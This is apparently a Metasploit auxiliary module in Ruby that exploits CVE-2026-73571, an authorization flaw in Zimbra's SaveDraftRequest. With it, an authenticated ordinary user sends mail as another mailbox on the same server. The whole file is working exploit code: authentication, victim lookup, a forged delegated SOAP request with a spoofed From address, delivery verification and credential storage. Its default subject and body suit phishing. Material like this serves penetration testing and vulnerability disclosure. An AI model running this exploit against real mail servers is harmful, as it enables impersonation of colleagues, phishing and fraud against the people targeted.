##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Zimbra
  include Msf::Exploit::Retry
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  ZIMBRA_MAIL_NS = 'urn:zimbraMail'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zimbra SaveDraftRequest Email Impersonation',
        'Description' => %q{
          CVE-2026-73571 is an authorization failure in Zimbra Collaboration's
          delegated SaveDraftRequest path. An ordinary authenticated user can
          select another mailbox on the same mailbox server in the From element and cause Zimbra to
          send the message under that account's owner context. The legitimate
          MTA path also saves the message in the selected account's Sent folder.

          The vulnerability requires no delegation grant or privileged account.
          It is known to affect Zimbra 10.1.16, was absent in the original
          10.1.0 release, and is fixed in 10.1.17. The exact introduced release
          is unknown.

          When the recipient is the authenticated attacker, or recipient
          credentials are supplied, the module independently polls that Inbox
          and verifies the resulting From address. Without that verification,
          an accepted SOAP response remains unverified on every version.
        },
        'Author' => [
          'Ayoub Nabil Boubagrat', # Vulnerability discovery
          'Crypto-Cat' # Research, PoC, and module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-73571'],
          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories'],
          ['URL', 'https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1/'],
          ['URL', 'https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/CVE-2026-73571.md']
        ],
        'DisclosureDate' => '2026-08-13',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, ACCOUNT_LOCKOUTS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Ordinary attacker Zimbra email address']),
        OptString.new('PASSWORD', [true, 'Password for USERNAME']),
        OptString.new('VICTIM', [true, 'Local Zimbra mailbox to impersonate']),
        OptString.new('RECIPIENT', [true, 'Message recipient; USERNAME enables automatic verification']),
        OptString.new('SUBJECT', [true, 'Email subject', 'Important message']),
        OptString.new('BODY', [true, 'Email body', 'Please act on this at your earliest convenience.']),
        OptEnum.new('FORMAT', [true, 'Email body format', 'plain', %w[plain html]]),
        OptString.new('VERIFY_USERNAME', [false, 'Credentials for a local RECIPIENT mailbox']),
        OptString.new('VERIFY_PASSWORD', [false, 'Password for VERIFY_USERNAME']),
        OptInt.new('VERIFY_TIMEOUT', [true, 'Polling deadline in seconds for verified Inbox delivery', 30])
      ]
    )
  end

  def check
    @prepared_context = nil
    reason = option_error
    return Msf::Exploit::CheckCode::Unknown(reason) if reason

    context = prepare_impersonation
    return check_code_for_context(context) unless context[:status] == :success

    @prepared_context = { key: preparation_key, context: context }

    case version_state(context[:version])
    when :affected
      Msf::Exploit::CheckCode::Appears(
        "Authenticated #{context[:attacker]} and local target #{context[:victim]} are confirmed on known affected #{context[:version]}"
      )
    when :fixed
      Msf::Exploit::CheckCode::Safe("#{context[:version]} includes the 10.1.17 authorization fix")
    when :not_affected
      Msf::Exploit::CheckCode::Safe("#{context[:version]} predates the vulnerable delegated-send path")
    else
      Msf::Exploit::CheckCode::Detected(
        "Zimbra SOAP and both accounts were verified#{version_suffix(context[:version])}, but this version is outside the known boundary"
      )
    end
  end

  def run
    prepared = @prepared_context
    @prepared_context = nil
    validate_options!
    # Reuse the context from this run's AutoCheck once, while its options still match.
    context = if datastore['AutoCheck'] && prepared && prepared[:key] == preparation_key
                prepared[:context]
              else
                prepare_impersonation
              end
    fail_for_context!(context, 'prepare the impersonation') unless context[:status] == :success

    verification = context[:verification]

    marker = verification ? SecureRandom.hex(12) : nil
    context[:subject] = normalized_option('SUBJECT')
    context[:subject] = "#{context[:subject]} [MSF-#{marker}]" if marker

    print_status("Sending a delegated message from #{context[:victim]} to #{context[:recipient]}")
    print_status("Subject: #{context[:subject]}")
    result = send_impersonated_email(context)
    fail_for_context!(result, 'submit SaveDraftRequest') unless result[:status] == :success

    proof = delivery_proof(context, verification, marker)

    unless proof[:status] == :success
      print_warning("Email impersonation was not verified: #{proof[:reason]}")
      return
    end

    print_good(proof[:reason])
    service = report_soap_service(context[:version])
    report_vuln(
      host: rhost,
      name: 'Zimbra SaveDraftRequest Email Impersonation',
      refs: references,
      info: proof[:reason],
      # AutoCheck can create the CVE record before delivery; retain verified proof on that record.
      details: {
        key: { src: fullname },
        src: fullname,
        proof: proof[:reason]
      },
      service: service
    )
  end

  def report_vuln(opts = {})
    super(opts.merge(service: opts[:service] || @soap_service))
  end

  private

  def validate_options!
    reason = option_error
    fail_with(Failure::BadConfig, reason) if reason
  end

  def option_error
    %w[USERNAME VICTIM RECIPIENT].each do |option|
      value = datastore[option]
      reason = zimbra_account_name_error(value, option)
      return reason if reason
      return "#{option} must contain at most 320 bytes" if value.encode(::Encoding::UTF_8).bytesize > 320
    end
    return 'PASSWORD must not be empty' unless option_present?('PASSWORD')
    return 'PASSWORD cannot be represented in XML 1.0' unless zimbra_xml_string(datastore['PASSWORD'])

    subject = datastore['SUBJECT']
    return 'SUBJECT must not be empty' unless option_present?('SUBJECT')
    return 'SUBJECT cannot be represented in XML 1.0' unless zimbra_xml_string(subject)

    subject = subject.encode(::Encoding::UTF_8)
    return 'SUBJECT must be a single line' if subject.match?(/[\r\n]/)
    return 'SUBJECT must contain at most 470 bytes' if subject.bytesize > 470

    body = datastore['BODY'].to_s
    return 'BODY cannot be represented in XML 1.0' unless zimbra_xml_string(body)
    return 'BODY must contain at most 1,048,576 bytes' if body.encode(::Encoding::UTF_8).bytesize > 1_048_576
    return 'VERIFY_USERNAME and VERIFY_PASSWORD must be supplied together' if verification_partial?
    return 'VERIFY_TIMEOUT must be between 1 and 120' unless datastore['VERIFY_TIMEOUT'].between?(1, 120)

    if verification_configured?
      reason = zimbra_account_name_error(datastore['VERIFY_USERNAME'], 'VERIFY_USERNAME')
      return reason if reason
      return 'VERIFY_PASSWORD cannot be represented in XML 1.0' unless zimbra_xml_string(datastore['VERIFY_PASSWORD'])
    end

    nil
  end

  def verification_partial?
    option_present?('VERIFY_USERNAME') != option_present?('VERIFY_PASSWORD')
  end

  def verification_configured?
    option_present?('VERIFY_USERNAME') && option_present?('VERIFY_PASSWORD')
  end

  def option_present?(name)
    datastore[name].is_a?(String) && !datastore[name].empty?
  end

  def normalized_option(name)
    zimbra_xml_string(datastore[name])
  end

  def preparation_key
    values = [rhost, rport, ssl, vhost, target_uri.path, datastore['Proxies'], workspace, active_db?]
    values.concat(%w[USERNAME PASSWORD VICTIM RECIPIENT VERIFY_USERNAME VERIFY_PASSWORD].map { |option| datastore[option] })
    values.map { |value| value.is_a?(String) ? value.dup : value }
  end

  def prepare_impersonation
    context = prepare_context
    return context unless context[:status] == :success

    verification = prepare_delivery_verification(context)
    return verification if verification && verification[:status] != :success

    context.merge(verification: verification)
  end

  def prepare_context
    @soap_service = nil
    @recorded_credentials = {}
    authentication = zimbra_authenticate(datastore['USERNAME'], datastore['PASSWORD'])
    return authentication unless authentication[:status] == :success

    record_authentication(datastore['USERNAME'], datastore['PASSWORD'], authentication)

    info = zimbra_get_info(authentication[:token])
    return info unless info[:status] == :success

    report_soap_service(info[:version])

    attacker = zimbra_account_info(authentication[:token], info[:name])
    return attacker.merge(reason: "Unable to resolve USERNAME: #{result_reason(attacker)}") unless attacker[:status] == :success
    unless attacker[:name].casecmp?(info[:name]) && (info[:id].nil? || attacker[:id].casecmp?(info[:id]))
      return { status: :malformed, reason: 'GetAccountInfo returned a different identity for USERNAME' }
    end

    victim = zimbra_account_info(authentication[:token], datastore['VICTIM'])
    return victim.merge(reason: "Unable to resolve VICTIM: #{result_reason(victim)}") unless victim[:status] == :success
    return { status: :bad_config, reason: 'VICTIM resolves to the authenticated account' } if victim[:id].casecmp?(attacker[:id])
    if attacker[:mail_host].blank? || victim[:mail_host].blank?
      return { status: :unexpected, reason: 'Unable to determine the mailbox server for USERNAME and VICTIM' }
    end
    unless attacker[:mail_host] == victim[:mail_host]
      return { status: :not_vulnerable, reason: 'USERNAME and VICTIM reside on different mailbox servers' }
    end

    {
      status: :success,
      token: authentication[:token],
      attacker: info[:name],
      victim: victim[:name],
      recipient: normalized_option('RECIPIENT'),
      version: info[:version]
    }
  end

  def prepare_delivery_verification(context)
    if !verification_configured? &&
       (context[:recipient].casecmp?(context[:attacker]) || context[:recipient].casecmp?(normalized_option('USERNAME')))
      return { status: :success, token: context[:token], account: context[:attacker] }
    end
    return unless verification_configured?

    authentication = zimbra_authenticate(datastore['VERIFY_USERNAME'], datastore['VERIFY_PASSWORD'])
    return authentication unless authentication[:status] == :success

    record_authentication(datastore['VERIFY_USERNAME'], datastore['VERIFY_PASSWORD'], authentication)

    info = zimbra_get_info(authentication[:token])
    return info unless info[:status] == :success
    unless info[:name].casecmp?(context[:recipient])
      return { status: :bad_config, reason: "VERIFY_USERNAME resolves to #{info[:name]}, not RECIPIENT" }
    end

    { status: :success, token: authentication[:token], account: info[:name] }
  end

  def send_impersonated_email(context)
    document = zimbra_soap_envelope(auth_token: context[:token]) do |xml|
      xml.SaveDraftRequest('xmlns' => ZIMBRA_MAIL_NS, 'isDelegatedReq' => '1') do
        xml.m do
          xml.e('t' => 't', 'a' => context[:recipient])
          xml.e('t' => 'f', 'a' => context[:victim])
          xml.su(context[:subject])
          xml.mp('ct' => "text/#{datastore['FORMAT']}") { xml.content(normalized_option('BODY')) }
        end
      end
    end
    result = zimbra_soap_request(
      document,
      expected_response: 'SaveDraftResponse',
      namespace: ZIMBRA_MAIL_NS,
      auth_token: context[:token]
    )
    return result unless result[:status] == :success

    message = result[:node].at_xpath('./mail:m', 'mail' => ZIMBRA_MAIL_NS)
    return { status: :unexpected, reason: 'SaveDraftResponse omitted its message element' } unless message
    # Delegated delivery returns an empty m element; an ID denotes an ordinary saved draft.
    if message['id'].present?
      return { status: :not_vulnerable, reason: 'Zimbra created an ordinary draft instead of entering the delegated-send path' }
    end

    { status: :success }
  end

  def wait_for_delivery(context, verification, marker)
    result = poll_until_truthy(timeout: datastore['VERIFY_TIMEOUT']) do
      result = search_marker(verification[:token], marker)
      result unless result[:status] == :not_found
    end
    return { status: :timeout, reason: 'Timed out waiting for the unique message in the verification Inbox' } unless result
    return result unless result[:status] == :success

    if result[:from]&.casecmp?(context[:victim])
      { status: :success, reason: "Verified Inbox delivery from #{context[:victim]} to #{verification[:account]}" }
    else
      { status: :not_vulnerable, reason: "The message was delivered from #{result[:from] || 'an unknown sender'}, not VICTIM" }
    end
  end

  def delivery_proof(context, verification, marker)
    return wait_for_delivery(context, verification, marker) if verification

    {
      status: :unverified,
      reason: 'The delegated response does not reveal the effective sender or prove final delivery'
    }
  end

  def search_marker(token, marker)
    document = zimbra_soap_envelope(auth_token: token) do |xml|
      xml.SearchRequest('xmlns' => ZIMBRA_MAIL_NS, 'types' => 'message', 'limit' => '10') do
        xml.query("in:inbox MSF-#{marker}")
      end
    end
    result = zimbra_soap_request(document, expected_response: 'SearchResponse', namespace: ZIMBRA_MAIL_NS, auth_token: token)
    return result unless result[:status] == :success

    messages = result[:node].xpath('./mail:m', 'mail' => ZIMBRA_MAIL_NS)
    message = messages.find do |item|
      subject = item['su'].presence || item.at_xpath('./mail:su', 'mail' => ZIMBRA_MAIL_NS)&.text
      subject&.include?("MSF-#{marker}")
    end
    return { status: :not_found, reason: 'The unique message is not present yet' } unless message

    from = message.at_xpath('./mail:e[@t="f"]', 'mail' => ZIMBRA_MAIL_NS)&.[]('a')
    { status: :success, from: from, id: message['id'] }
  end

  def version_state(version)
    return :unknown unless version
    return :affected if version == Rex::Version.new('10.1.16')
    return :not_affected if version == Rex::Version.new('10.1.0')
    return :fixed if version >= Rex::Version.new('10.1.17')

    :unknown
  end

  def check_code_for_context(result)
    return Msf::Exploit::CheckCode::Safe(result_reason(result)) if result[:status] == :not_vulnerable

    Msf::Exploit::CheckCode::Unknown(result_reason(result))
  end

  def fail_for_context!(result, operation)
    reason = result_reason(result)
    case result[:status]
    when :unreachable
      fail_with(Failure::Unreachable, "Unable to #{operation}: #{reason}")
    when :auth_failed, :authentication_incomplete
      fail_with(Failure::NoAccess, "Unable to #{operation}: #{reason}")
    when :not_found, :bad_config
      fail_with(Failure::BadConfig, "Unable to #{operation}: #{reason}")
    when :not_vulnerable
      fail_with(Failure::NotVulnerable, "Unable to #{operation}: #{reason}")
    when :soap_fault
      if %w[service.PERM_DENIED service.AUTH_REQUIRED].include?(result[:fault_code])
        fail_with(Failure::NoAccess, "Unable to #{operation}: #{reason}")
      end

      fail_with(Failure::UnexpectedReply, "Unable to #{operation}: #{reason}")
    else
      fail_with(Failure::UnexpectedReply, "Unable to #{operation}: #{reason}")
    end
  end

  def result_reason(result)
    result[:reason].presence || result[:fault_code].presence || result[:http_code].presence || result[:status].to_s
  end

  def record_authentication(username, password, authentication)
    @recorded_credentials ||= {}
    return if @recorded_credentials[username]

    service = report_soap_service
    service_data = {
      origin_type: :service,
      address: rhost,
      port: rport,
      service_name: 'zimbra-soap',
      protocol: 'tcp',
      access_level: 'user'
    }
    service_data[:service_id] = service.id if service
    store_valid_credential(
      user: username,
      private: password,
      private_type: :password,
      proof: authentication[:http_code],
      service_data: service_data
    )
    @recorded_credentials[username] = true
  end

  def report_soap_service(version = nil)
    return @soap_service if version.blank? && @soap_service

    common = { host: rhost, port: rport, proto: 'tcp' }
    tcp = common.merge(name: 'tcp', parents: nil)
    web = ssl ? common.merge(name: 'https', parents: common.merge(name: 'ssl', parents: tcp)) : common.merge(name: 'http', parents: tcp)
    info = 'Zimbra SOAP API'
    info = "#{info} #{version}" if version.present?
    @soap_service = report_service(
      common.merge(
        name: 'zimbra-soap',
        info: info,
        resource: { uri: normalize_uri(target_uri.path, 'service', 'soap') },
        parents: web
      )
    )
  end

  def version_suffix(version)
    version.present? ? " on #{version}" : ''
  end
end
